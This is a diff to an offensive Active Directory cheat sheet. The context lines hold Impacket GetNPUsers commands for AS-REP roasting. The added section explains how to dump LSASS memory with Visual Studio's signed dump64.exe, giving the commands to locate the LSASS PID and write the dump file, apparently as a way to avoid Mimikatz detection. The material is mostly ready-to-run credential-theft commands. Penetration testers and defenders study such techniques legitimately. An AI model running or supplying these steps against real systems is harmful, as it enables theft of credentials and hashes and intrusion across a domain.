@@ -396,6 +396,29 @@ python GetNPUsers.py <domain_name>/<domain_user>:<domain_user_password> -request
 # check ASREPRoast for a list of users (no credentials required)
 python GetNPUsers.py <domain_name>/ -usersfile <users_file> -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
 ```
+## Dumping LSASS With Visual Studio:
+
+Dump64: Memory dump tool that comes with Microsoft Visual Studio
+
+Path: C:\Program Files (x86)\Microsoft Visual Studio\Installer\Feedback\dump64.exe
+
+Enumerate for Visual Studio install:
+
+```
+C:\> code -v
+```
+
+Find LSASS PID:
+
+```
+tasklist /fi "Imagename eq lsass.exe"
+```
+
+Uuse Dump64 to dump LSASS:
+
+```
+C:\> dump64.exe <pid> out.dmp
+```
 
 ## Dumping LSASS Without Mimikatz:
 
